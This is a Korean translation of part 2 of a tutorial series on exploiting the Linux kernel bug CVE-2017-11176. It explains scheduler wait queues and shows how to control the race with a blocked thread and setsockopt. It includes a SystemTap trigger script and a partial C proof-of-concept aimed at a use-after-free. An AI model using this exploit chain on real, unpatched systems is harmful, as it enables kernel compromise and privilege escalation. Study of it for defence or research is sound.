---
layout: single
title:  "CVE-2017-11176: 한 걸음 한 걸음 리눅스 커널 익스플로잇하기 (part 2/4)"
date:   2019-08-12 15:36:24 +0900
classes: wide
categories: Security
sidebar: 
    nav: "security"
---
*LEXFO의 [CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 2/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html)를 번역한 문서입니다. 번역이 애매한 경우엔 원문의 단어를 옆에 적어두었습니다.*

# 소개

[이전 파트](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)의 내용은 CVE-2017-11176(aka. "mq\_notify: double sock\_put()")에 대한 자세한 분석과 공격 시나리오였다.

버그를 검증하기 위해 커널 영역에서 (System Tap을 이용하여) 강제로 트리거를 했고, (취약한 코드에 도달만 하는) 익스플로잇의 초안을 만들었다.

이 과정에서 버그를 트리거하기 위한 세 가지 요구 조건과 충족시키는 방법이 드러났다:

1. 강제로 netlink\_attachskb()가 1을 반환하도록 하기
2. 익스플로잇 스레드 unblock하기
3. 강제로 두 번째 *fget()* 호출이 NULL을 반환하도록 하기

이번 파트에선 System Tap 스크립트를 제거하고 유저 영역의 코드만 사용하여 위 요구 조건들을 만족시킬 것이다. 문서 마지막에는 확실하게 버그를 트리거하는 완전한 proof-of-concept 코드를 만들게 된다.

- - -

# 목차

* [핵심 개념 #2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#core-concepts)
* [메인 스레드 unblock하기](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#unblock-main-thread)
* [두 번째 루프에서 fget()이 실패하게 하기](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#making-fget-fail-on-second-loop)
* ["retry" label로 되돌아가기](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#looping-back-to-retry-label)
* [최종 Proof-Of-Concept 코드](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#final-poc-code)
* [결론](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#conclusion)

- - -

# <a name='core-concepts'></a>핵심 개념 #2

두 번째 "core concepts" 섹션은 스케쥴러 하위 시스템(subsystem)에 대해 소개한다. 첫 주안점은 task의 상태와 task가 다양한 상태간에 전환되는 방법에 대한 것이다. 실제 스케쥴러 알고리즘([Completely Fair Scheduler](https://www.linuxjournal.com/node/10267))에 대해선 다루지 않는다.

여기선 **wait queues**가 굉장히 중요하게 다뤄진다. wait queue는 이번 파트에서 스레드를 unblock하는 데 사용되고, 익스플로잇 과정에서 arbitrary call primitive를 얻는(gain) 데도 사용된다(part 3 참고).

## Task State

task의 *running*  상태는 task\_struct의 **state** 필드에 저장된다. task는 기본적으로 이 상태들 중 하나이다(상태는 더 다양하다):

* **Running**: 프로세스가 구동되는 중이거나 cpu에서 구동되길 기다림
* **Waiting**: 프로세스가 이벤트/자원을 기다리거나 sleep함

"running" 상태의 task(*TASK\_RUNNING*)는 **run queue**에 속한 task이다. cpu에서 구동 중이거나 곧 (스케쥴러가 선택하면) 구동된다.

"waiting" 상태의 task는 어떤 CPU에서도 구동 중이지 않은 task이다. 이런 task는 **wait queues**나 시그널을 통해 깨어날 수 있다. waiting 중의 task를 보통 *TASK\_INTERRUPTIBLE* 이라 한다(i.e. "sleeping"도 interrupt될 수 있다).

다양한 task의 상태는 여기 정의되어 있다:

```c
// [include/linux/sched.h]

#define TASK_RUNNING        0
#define TASK_INTERRUPTIBLE  1
// ... cut (other states) ...
```

state 필드는 직접적으로 혹은 "current" 매크로를 사용하는 **\_\_set\_current\_state()** helper를 통해서 다룰 수 있다:

```c
// [include/linux/sched.h]

#define __set_current_state(state_value)            \
    do { current->state = (state_value); } while (0)
```

## Run Queues

**struct rq** (run queue)는 스케쥴러에서 가장 중요한 데이터 구조 중 하나이다.  run queue에 있는 모든 task는 CPU에 의해 실행된다. 모든 CPU는 각자의 run queue를 가지고 있어서 진정한 멀티 태스킹이 가능하다. run queue엔 CPU에서 실행되도록 (스케쥴러에 의해) "선택될 수 있는" task의 목록이 담겨있다. 또 스케쥴러가 "공정한" 선택을 하기 위해 쓰이는 통계를 가지고 있으며 결국엔 각 cpu간의 부하(load)를 재조정한다(= cpu migration).

```c
// [kernel/sched.c]

struct rq {
  unsigned long nr_running;   // <----- statistics
  u64 nr_switches;            // <----- statistics
  struct task_struct *curr;   // <----- the current running task on the cpu
  // ...
};
```

**노트**: "Completely Fair Scheduler (CFS)"에선 실제 task가 저장되는 방식이 약간 복잡하지만 여기선 상관하지 않아도 된다.

간단하게 run queue에서 나간 task는 더이상 실행되지 않는다고 생각하자(= 그 task를 실행할 CPU가 없다). 이것이 정확히 **deactivate\_task()** 함수가 수행하는 일이다. 반대로, **activate\_task()**가 정확히 반대의 일을 한다(task를 run queue에 넣는다).

## Blocking a task and the schedule() function

task의 상태가 running에서 waiting으로 전환되려면 두 가지를 해야 한다:

1. 자신의 *running* 상태를 TASK\_INTERRUPTIBLE로 설정
2. run queue에서 나가기 위해 deactivate\_task() 호출

실제로는 deactive\_task()를 직접적으로 호출하지 않고 **schedule()**을 호출한다.

schedule() 함수는 스케쥴러의 가장 중요한 함수이다. schedule()이 호출되면 다음 (running 상태의) task가 CPU에서 구동되도록 선택되어야 한다. 즉 run queue의 **curr** 필드가 업데이트된다.

그러나 현재 task 상태가 running이 아니고(= 상태가 0이 아님) 보류 중인(pending) 시그널이 없을 때  schedule()이 호출되면 deactivate\_task() 함수가 실행된다:

```c
      asmlinkage void __sched schedule(void)
      {
        struct task_struct *prev, *next;
        unsigned long *switch_count;
        struct rq *rq;
        int cpu;

          // ... cut ...

        prev = rq->curr;    // <---- "prev" is the task running on the current CPU

        if (prev->state && !(preempt_count() & PREEMPT_ACTIVE)) {   // <----- ignore the "preempt" stuff
          if (unlikely(signal_pending_state(prev->state, prev)))
            prev->state = TASK_RUNNING;
          else
            deactivate_task(rq, prev, DEQUEUE_SLEEP);     // <----- task is moved out of run queue
          switch_count = &prev->nvcsw;
        }

        // ... cut (choose the next task) ...
      }
```

마지막으로 다음 절차를 통해 task가 block될 수 있다.

```c
void make_it_block(void)
{
  __set_current_state(TASK_INTERRUPTIBLE);
  schedule();
}
```

task는 *다른 무언가* 가 깨워줄 때까지 block된 상태로 있는다.

## Wait Queues

자원이나 특수한 이벤트를 기다리는 것은 아주 흔한 일이다. 예를 들어 서버를 구동하면, 서버의 메인 스레드는 접속이 오길 기다린다. "non blocking"으로 마킹된(marked as) 경우가 아니라면 accept() syscall이 메인 스레드를 block할 것이다. 즉 메인 스레드는 *다른 무언가* 가 깨워줄 때까지 커널 영역에 갇혀 있는다.

**wait queue**는 기본적으로 현재 block된(waiting 상태인) 프로세스들의 이중 연결 리스트이다. run queue의 "반대" 개념으로 보이기도 한다. queue 자체는 **wait\_queue\_head\_t**로 나타낸다(represent).

```c
// [include/linux/wait.h]

typedef struct __wait_queue_head wait_queue_head_t;

struct __wait_queue_head {
    spinlock_t lock;
    struct list_head task_list;
};
```

**노트**: 리눅스는 이중 연결 리스트를 **struct list\_head** 타입으로 구현한다.

wait queue에 있는 각각의 요소는 **wait\_queue\_t** 타입이다:

```c
// [include/linux.wait.h]

typedef struct __wait_queue wait_queue_t;
typedef int (*wait_queue_func_t)(wait_queue_t *wait, unsigned mode, int flags, void *key);

struct __wait_queue {
    unsigned int flags;
    void *private;                
    wait_queue_func_t func;     // <----- we will get back to this
    struct list_head task_list;
};
```

wait queue 요소는 **DECLARE\_WAITQUEUE()** 매크로를 이용하여 생성될 수 있다.

```c
// [include/linux/wait.h]

#define __WAITQUEUE_INITIALIZER(name, tsk) {                \
    .private    = tsk,                      \
    .func       = default_wake_function,            \
    .task_list  = { NULL, NULL } }

#define DECLARE_WAITQUEUE(name, tsk)                    \
    wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk) // <----- it creates a variable!
```

그리고 이 매크로는 이런 식으로 사용된다:

```c
DECLARE_WAITQUEUE(my_wait_queue_elt, current); // <----- use the "current" macro
```

마지막으로, wait queue 요소가 선언되면 **add\_wait\_queue()** 함수를 통해 wait queue에 들어간다. 이 함수는 적절한 *locking* (지금은 신경쓰지 않아도 된다)과 함께 요소를 이중 연결 리스트에 추가한다.

```c
// [kernel/wait.c]

void add_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)
{
    unsigned long flags;

    wait->flags &= ~WQ_FLAG_EXCLUSIVE;
    spin_lock_irqsave(&q->lock, flags);
    __add_wait_queue(q, wait);              // <----- here
    spin_unlock_irqrestore(&q->lock, flags);
}

static inline void __add_wait_queue(wait_queue_head_t *head, wait_queue_t *new)
{
    list_add(&new->task_list, &head->task_list);
}
```

**add\_wait\_queue()**를 실행하는 것을 "wait queue에 등록한다"라고 부르기도 한다.

## Waking up a task

지금까지 run queue와 wait queue라는 두 종류의 queue가 있음을 알게 되었다. task를 block한다는 것은 그냥 task를 run queue에서 (deactivate\_task()를 이용하여) 제거하는 것이었다. 그렇다면 block된(sleeping) 상태에서 running 상태로는 어떻게 전환될까?

**노트**: block된 task는 시그널(이나 다른 수단)을 통해서도 깨울 수 있지만 여기선 주제를 벗어나는 내용이다.

block된 task는 구동 중이 아니므로 **자기 자신을 깨울 수는 없다**. **다른 task**가 깨워주어야 한다.

특정 자원을 가지고 있는 데이터 구조들은 wait queue를 가진다. task가 자원을 사용하고 싶은데 그 순간에 사용할 수 없는 경우, task는 자기 자신을 sleeping 상태로 놓고 자원의 소유자가 깨워주기를 기다린다.

자원을 사용할 수 있게 되었을 때 깨기 위해선 그 자원의 wait queue에 등록이 되어 있어야 한다. 앞서 봤듯이 이런 "등록"은 **add\_wait\_queue()**를 호출하여 이뤄진다.

자원이 사용 가능해지면 자원의 소유자는 하나 혹은 여러 task를 깨워 이어서 실행이 되게끔 한다. 이는 **\_\_wake\_up()** 함수를 통해 이뤄진다:

```c
// [kernel/sched.c]

/**
 * __wake_up - wake up threads blocked on a waitqueue.
 * @q: the waitqueue
 * @mode: which threads
 * @nr_exclusive: how many wake-one or wake-many threads to wake up
 * @key: is directly passed to the wakeup function
 *
 * It may be assumed that this function implies a write memory barrier before
 * changing the task state if and only if any tasks are woken up.
 */

void __wake_up(wait_queue_head_t *q, unsigned int mode,
            int nr_exclusive, void *key)
{
    unsigned long flags;

    spin_lock_irqsave(&q->lock, flags);
    __wake_up_common(q, mode, nr_exclusive, 0, key);    // <----- here
    spin_unlock_irqrestore(&q->lock, flags);
}
```

```c
    // [kernel/sched.c]

    static void __wake_up_common(wait_queue_head_t *q, unsigned int mode,
          int nr_exclusive, int wake_flags, void *key)
    {
      wait_queue_t *curr, *next;

[0]   list_for_each_entry_safe(curr, next, &q->task_list, task_list) {
        unsigned flags = curr->flags;

[1]     if (curr->func(curr, mode, wake_flags, key) &&
            (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
          break;
      }
    }
```

이 함수는 wait queue의 모든 요소에 대해 반복된다 [0] (**list\_for\_each\_entry\_safe()**는 이중 연결 리스트에서 흔히 쓰이는 매크로다). 각각의 요소에 대해 **func()** 콜백이 실행된다 [1].

DECLARE\_WAITQUEUE() 매크로가 기억나는가? 이 매크로는 func 콜백을 **default\_wake\_function**으로 설정한다:

```c
// [include/linux/wait.h]

#define __WAITQUEUE_INITIALIZER(name, tsk) {                \
    .private    = tsk,                      \
    .func       = default_wake_function,            \                 // <------
    .task_list  = { NULL, NULL } }

#define DECLARE_WAITQUEUE(name, tsk)                    \
    wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk)
```

차례차례, default\_wake\_function()은 wait queue 요소의 **private** 필드(대부분의 시간동안 sleeping 상태인 task의 *task\_struct* 를 가리킴)를 이용하여 **try\_to\_wake\_up()** 을 호출한다:

```c
int default_wake_function(wait_queue_t *curr, unsigned mode, int wake_flags,
              void *key)
{
    return try_to_wake_up(curr->private, mode, wake_flags);
}
```

마지막으로, try\_to\_wake\_up()은 schedule()의 "반대" 개념같은 것이다. schedule()이 현재 task를 "스케쥴에서 제외"한다면, try\_to\_wake\_up()은 task가 다시 스케쥴에 들어갈 수 있게 한다. 즉 task를 run queue에 넣고 running 상태로 바꾸는 것이다!

```c
static int try_to_wake_up(struct task_struct *p, unsigned int state,
              int wake_flags)
{
    struct rq *rq;

    // ... cut (find the appropriate run queue) ...

out_activate:
    schedstat_inc(p, se.nr_wakeups);              // <----- update some stats
    if (wake_flags & WF_SYNC)
        schedstat_inc(p, se.nr_wakeups_sync);
    if (orig_cpu != cpu)
        schedstat_inc(p, se.nr_wakeups_migrate);
    if (cpu == this_cpu)
        schedstat_inc(p, se.nr_wakeups_local);
    else
        schedstat_inc(p, se.nr_wakeups_remote);
    activate_task(rq, p, en_flags);               // <----- put it back to run queue!
    success = 1;

    p->state = TASK_RUNNING;                      // <----- the state has changed!

    // ... cut ...
}
```

여기서 **activate\_task()**가 실행된다(실행되는 다른 곳도 있다). task가 다시 run queue로 돌아왔고 **동시에** TASK\_RUNNING 상태이기 때문에 스케쥴에 들어갈 기회가 생겼다. 그러므로 schedule() 호출 이후 부분에서 실행을 이어나간다.

실제로 \_\_wake\_up()은 바로 호출되지 않는다. 대신 실행되는 helper 매크로가 있다:

```c
// [include/linux/wait.h]

#define wake_up(x)          __wake_up(x, TASK_NORMAL, 1, NULL)
#define wake_up_nr(x, nr)       __wake_up(x, TASK_NORMAL, nr, NULL)
#define wake_up_all(x)          __wake_up(x, TASK_NORMAL, 0, NULL)

#define wake_up_interruptible(x)    __wake_up(x, TASK_INTERRUPTIBLE, 1, NULL)
#define wake_up_interruptible_nr(x, nr) __wake_up(x, TASK_INTERRUPTIBLE, nr, NULL)
#define wake_up_interruptible_all(x)    __wake_up(x, TASK_INTERRUPTIBLE, 0, NULL)
```

## A Complete Example

앞서 말한 개념을 요약하는 간단한 예시가 있다:

```c
struct resource_a {
  bool resource_is_ready;
  wait_queue_head_t wq;
};

void task_0_wants_resource_a(struct resource_a *res)
{
  if (!res->resource_is_ready) {
    // "register" to be woken up
    DECLARE_WAITQUEUE(task0_wait_element, current);
    add_wait_queue(&res->wq, &task0_wait_element);

    // start sleeping
    __set_current_state(TASK_INTERRUPTIBLE);
    schedule();

    // We'll restart HERE once woken up
    // Remember to "unregister" from wait queue
  }

  // XXX: ... do something with the resource ...
}

void task_1_makes_resource_available(struct resource_a *res)
{
  res->resource_is_ready = true;
  wake_up_interruptible_all(&res->wq);  // <--- unblock "task 0"
}
```

한 스레드가 *task\_0\_wants\_resource\_a()* 함수를 실행하고 사용 가능한 "자원"이 없어 block된다. 적절한 시점에 자원 소유자는 (다른 스레드에서) 자원이 사용 가능하게 만들고 *task\_1\_makes\_resource\_available()* 을 호출한다. 이후에 task\_0\_wants\_resource\_a()의 실행이 재개될 수 있다.

리눅스 커널 코드에서 이런 패턴을 자주 보게 될 것이다. 이제 무슨 의미인지 알게 되었다. "자원"이라는 표현이 여기서 포괄적으로 사용되었다는 점을 주목하자. task들은 이벤트, 조건이 참이 되는 것이나 다른 것들을 기다릴 수 있다. "block"된 syscall을 보게 되면 wait queue가 멀지 않은 곳에 있을 것이다😊.

이제 다음으로 넘어가서 proof-of-concept 구현을 시작해보자.

- - -

# <a name='unblock-main-thread'></a>메인 스레드 unblock하기

[이전 파트](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 netlink\_attachskb()가 1을 반환하게 하려고 여러 문제(issue)를 해결(experiment)했다. 첫 문제는 mq\_notify()를 호출하면 **block**된다는 것이었다. 이걸 해결하려고 schedule\_timeout() 호출을 우회했더니 **무한 루프**에 빠졌다. file descriptor table (FDT)에서 file descriptor를 제거하여 무한 루프를 멈췄는데 우연히 마지막 조건(두 번째 fget() 호출의 NULL 반환)까지 들어맞았다. 이 모든 것은 System Tap 스크립트를 통해 가능했다:

```stap
    function force_trigger:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
[0]   sk->sk_flags |= (1 << SOCK_DEAD); // avoid blocking the thread

      struct netlink_sock *nlk = (void*) sk;
      nlk->state |= 1;   // enter the netlink_attachskb() retry path    

      struct files_struct *files = current->files;
      struct fdtable *fdt = files_fdtable(files);
      fdt->fd[3] = NULL; // makes the second call to fget() fails
    %}
```

이번 섹션에선 struct sock의 SOCK\_DEAD 플래그를 설정하는 [0]번 라인을 제거할 것이다. 그렇게 하면 mq\_notify()에 대한 호출이 다시 block될 텐데, 여기서 두 가지 가능성이 있다:

1. (stap 스크립트에서처럼) sock을 SOCK\_DEAD로 마킹(mark) 
2. 스레드를 unblock

## Control (and win) the race

우리의 메인 스레드가 block되는 것은 사실 **좋은 일이다**. 익스플로잇을 하는 관점에선 선물과도 같다. 패치 설명에 "작은 기회"라고 적혀 있었던 게 기억이 나는가? 우리의 공격 시나리오를 다시 보자:

```plaintext
Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
                                    |                       |             |             |                    |
  fget(<TARGET_FD>) -> ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -> ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(<TARGET_FD>) -> ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -> returns 1  |                       | 1           | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(<TARGET_FD>)    | 0 (-1)      | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(<TARGET_FD) -> returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -> UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
```

그러니까, "작은 기회"가 close()를 호출할 기회인 것이다. 상기해보면 close()를 호출하는 것이 fget()이 NULL을 반환하도록 한다. 기회는 fget() 호출이 성공한 **이후에** 생기고, 두 번째 fget() 호출 **이전에** 없어진다. 공격 시나리오를 보면 netlink\_attachskb() 이후에 close()를 호출하는데, system tap 스크립트에선 netlink\_attachskb() 이전에 (close()를 호출하지 않고) *시뮬레이션*을 했다.

schedule\_timeout() 호출을 우회하면 기회는 정말 "작을" 것이다. System Tap을 사용할 땐 netlink\_attachskb()를 호출하기 전 데이터 구조를 바꿨기 때문에 문제가 되지 않았다. 유저 영역에선 그리 순탄치 않을 것이다.

반면에, netlink\_attachskb() 실행 도중에 block을 하고 unlock할 방법이 있다면 기회는 우리가 원하는 만큼 커질 것이다. 다른 말로 하면 **race condition을 통제할** 방법이 있다는 것이다. 이를 메인 스레드 흐름에서의 "브레이크포인트"라고 볼 수도 있다.

공격 시나리오는 다음과 같이 변한다.

```plaintext
Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
  fget(<TARGET_FD>) -> ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -> ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(<TARGET_FD>) -> ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb()               |                       | 1           | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
    schedule_timeout() -> SLEEP     |                       | 1           | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(<TARGET_FD>)    | 0 (-1)      | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | UNBLOCK THREAD-1      | FREE        | 1           | 0xffffffc0aabbccdd |
    <<< Thread-1 wakes up >>>       |                       |             |             |                    |
    sock_put()                      |                       | FREE        | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -> returns 1  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(<TARGET_FD) -> returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -> UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
```

메인 스레드를 block하는 것은 race condition을 통제할 좋은 아이디어지만, 이제 unblock할 방법을 찾아야 한다.

## Identify "unblocker" candidates

"Core Concepts #2" 섹션의 내용을 이해하지 못했다면 나중에 다시 돌아올 순간이 생긴다. 이번 섹션에선 netlink\_attachskb()가 어떻게 block을 하고 어떻게 그걸 unblock하는지를 볼 것이다.

netlink\_attachskb()를 다시 보자:
```c
    // [net/netlink/af_netlink.c]

    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;

      nlk = nlk_sk(sk);

      if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
[0]     DECLARE_WAITQUEUE(wait, current);

        if (!*timeo) {
          // ... cut (unreachable code from mq_notify) ...
        }

[1]     __set_current_state(TASK_INTERRUPTIBLE);
[2]     add_wait_queue(&nlk->wait, &wait);

[3]     if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
            !sock_flag(sk, SOCK_DEAD))
[4]       *timeo = schedule_timeout(*timeo);

[5]     __set_current_state(TASK_RUNNING);
[6]     remove_wait_queue(&nlk->wait, &wait);

        sock_put(sk);

        if (signal_pending(current)) {
          kfree_skb(skb);
          return sock_intr_errno(*timeo);
        }
        return 1;
      }
      skb_set_owner_r(skb, sk);
      return 0;
    }
```

이제 코드가 익숙할 것이다. 스레드 blocking은 **\_\_set\_current\_state(TASK\_INTERRUPTIBLE)** [1]과 **schedule\_timeout()** [4]의 조합으로 이루어진다. 조건 [3]은 다음 때문에 참이다:

* System Tap으로 강제했다: *nlk->state* |= *1*
* sock이 이제 DEAD 상태가 아니다. 다음 라인을 삭제했다: *sk->sk\_flags* |= *(1 << SOCK\_DEAD)*

**노트**: schedule\_timeout(MAX\_SCHEDULE\_TIMEOUT) 호출은 schedule()을 호출하는 것과 같다.

알다시피 block된 스레드는 **wake queue**에 등록되어 있을 때 깨워질 수 있다. wait queue에 등록되는 것은 [0]과 [2]를 통해서, 등록 해제되는 것은 [6]에서 이루어진다. wait queue 자체는 **nlk->wait**이다. 즉 netlink\_sock 오브젝트에 속해있다:

```c
struct netlink_sock {
    /* struct sock has to be the first member of netlink_sock */
    struct sock     sk;
  // ... cut ...
    wait_queue_head_t   wait;           // <----- the wait queue
  // ... cut ...
};
```

이는 **block된 스레드를 깨우는 것은 netlink\_sock 오브젝트의 역할**이라는 뜻이다.

*nlk->wait* wait queue는 다음 네 군데에서 사용된다:

1. \_\_netlink\_create()
2. netlink\_release()
3. netlink\_rcv\_wake()
4. netlink\_setsockopt()

\_\_netlink\_create() 함수는 netlink socket 생성 중에 호출되고 비어있는 wait queue를 **init\_waitqueue\_head()**로 초기화한다.

*netlink\_rcv\_wake()* 함수는 **netlink\_recvmsg()**에 의해 실행되어 **wake\_up\_interruptible()**을 호출한다. *block* 이 되는 첫 이유가 receive buffer가 꽉 차있다는 것이었으므로 이는 말이 된다(?). *netlink\_recvmsg()* 가 실행된다면 이는 receive buffer에 남은 공간이 있을 가능성이 있는 것이다.

*netlink\_release()*  함수는 연관된 struct file이 free되려 할 때(레퍼런스 카운터가 0이 될 때) 실행되고 **wake\_up\_interruptible\_all()** 함수를 실행한다.

마지막으로 *netlnk\_release()* 는 *setsockopt()* syscall을 통해 실행된다. "optname"이 **NETLINK\_NO\_ENOBUFS**라면 **wake\_up\_interruptible()**이 호출된다.

이제 우리의 스레드를 깨워줄 후보가 셋 있다(netlink\_create()는 아무 것도 깨우지 않기 때문에 제외되었다). 이런 선택의 기로에서 다음과 같은 경로를 골라야 한다:

* 원하는 타겟(우리의 경우엔 wake\_up\_interruptible())에 빠르게 도달할 수 있는 것. 즉 적은 수의 "조건"을 통과하면 되는 것.
* 커널에 영향/부작용이 적은 것(메모리 할당 없음, 다른 데이터 구조를 건드리지 않음 등).

netlink\_release() 경로는 익스플로잇과 관련된 문제로 제외된다. [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 볼 수 있듯이 sock에 연관된 struct file을 free하면 안된다. 이는 그 struct file이 우리가 조심스럽게 use-after-free를 트리거하는 수단이기 때문이다. 

netlink\_rcv\_wake() 경로는 제일 "복잡한" 경로이다. "recvmsg()" syscall에서 해당 함수에 도달하기 전에 *generic* 소켓 API의 여러 검사를 통과해야 한다. 게다가 여러 것들을 할당하기도 한다. call trace는 다음과 같다:

```plaintext
- SYSCALL_DEFINE3(recvmsg)
- __sys_recvmsg
- sock_recvmsg
- __sock_recvmsg
- __sock_recvmsg_nosec  // calls sock->ops->recvmsg()
- netlink_recvmsg
- netlink_rcv_wake
- wake_up_interruptible
```

"setsockopt()"의 call trace와 비교해보자:

```plaintext
- SYSCALL_DEFINE5(setsockopt) // calls sock->ops->setsockopt()
- netlink_setsockopt()
- wake_up_interruptible
```

훨씬 간단하지 않은가?

## Reaching wake\_up\_interruptible() from setsockopt syscall

이전 섹션에 따르면 setsockopt syscall을 이용하여 wake\_up\_interruptible()에 도달하는 것이 제일 간단한 방법이었다. 그럼 통과해야 하는 검사들을 분석해보자:

```c
    // [net/socket.c]

    SYSCALL_DEFINE5(setsockopt, int, fd, int, level, int, optname,
        char __user *, optval, int, optlen)
    {
      int err, fput_needed;
      struct socket *sock;

[0]   if (optlen < 0)
        return -EINVAL;

      sock = sockfd_lookup_light(fd, &err, &fput_needed);
[1]   if (sock != NULL) {
        err = security_socket_setsockopt(sock, level, optname);
[2]     if (err)
          goto out_put;

[3]     if (level == SOL_SOCKET)
          err =
              sock_setsockopt(sock, level, optname, optval,
                  optlen);
        else
          err =
[4]           sock->ops->setsockopt(sock, level, optname, optval,
                  optlen);
    out_put:
        fput_light(sock->file, fput_needed);
      }
      return err;
    }
```

syscall 자체에선 다음이 필요하다:

* [0] - **optlen**이 음수가 아닐 것
* [1] - **fd**가 유효한 소켓일 것
* [2] - LSM이 socket에(for a socket) setsockopt()를 호출하는 것을 **꼭** 허용해줄 것
* [3] - **level**이 SOL\_SOCKET과 다를 것

이 모든 검사를 통과하면 netlink\_setsockopt()가 호출될 것이다 [4]:

```c
    // [net/netlink/af_netlink.c]

    static int netlink_setsockopt(struct socket *sock, int level, int optname,
                char __user *optval, unsigned int optlen)
    {
      struct sock *sk = sock->sk;
      struct netlink_sock *nlk = nlk_sk(sk);
      unsigned int val = 0;
      int err;

[5]   if (level != SOL_NETLINK)
        return -ENOPROTOOPT;

[6]   if (optlen >= sizeof(int) && get_user(val, (unsigned int __user *)optval))
        return -EFAULT;

      switch (optname) {
        // ... cut (other options) ...

[7]   case NETLINK_NO_ENOBUFS:
[8]     if (val) {
          nlk->flags |= NETLINK_RECV_NO_ENOBUFS;
          clear_bit(0, &nlk->state);
[9]       wake_up_interruptible(&nlk->wait);
        } else
          nlk->flags &= ~NETLINK_RECV_NO_ENOBUFS;
        err = 0;
        break;
      default:
        err = -ENOPROTOOPT;
      }
      return err;
    }
```

추가적인 검사는 다음과 같다:

* [5] - **level**이 SOL\_NETLINK여야 함
* [6] - **optlen**이 *sizeof(int)* 보다 크거나 같아야 하고 **optval**이 읽기 가능한 메모리 영역이어야 함
* [7] - **optname**이 NETLINK\_NO\_ENOBUFS여야 함
* [8] - **val**이 0이 아니어야 함.

모든 검사를 통과하면 wake\_up\_interruptable()이 실행되어 block된 스레드를 깨워줄 것이다. 마지막에 다음 코드 조각(snippet)이 해당 함수를 실행할 것이다:

```c
int sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC); // same socket used by blocking thread
int val = 3535; // different than zero
_setsockopt(sock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val));
```

이걸 익스플로잇에 반영해보자

## Updating The Exploit

이전 섹션에선 어떻게 유저 영역에서 setsockopt() syscall을 이용하여 wake\_up\_interruptible()을 실행하는지 보았다. 하지만 아직 문제가 하나 남아있다. block됐으면 뭘 어떻게 호출하는가? **정답은 여러 스레드를 사용하는 것이다**!

자, 그럼 다른 스레드를 생성하도록 익스플로잇을 갱신하자(익스플로잇에서 **unblock\_thread**를 호출한다)("-pthread" 옵션을 줘서 컴파일하자):

```c
    struct unblock_thread_arg
    {
      int fd;
      bool is_ready;  // we could use pthread's barrier here instead
    };

    static void* unblock_thread(void *arg)
    {
      struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
      int val = 3535; // need to be different than zero

      // notify the main thread that the unblock thread has been created
      uta->is_ready = true; 
      // WARNING: the main thread *must* directly call mq_notify() once notified!
      sleep(5); // gives some time for the main thread to block

      printf("[unblock] unblocking now\n");
      if (_setsockopt(uta->fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
      return NULL;
    }

    int main(void)
    {
      struct sigevent sigev;
      char sival_buffer[NOTIFY_COOKIE_LEN];
      int sock_fd;
      pthread_t tid;
      struct unblock_thread_arg uta;

      // ... cut ...

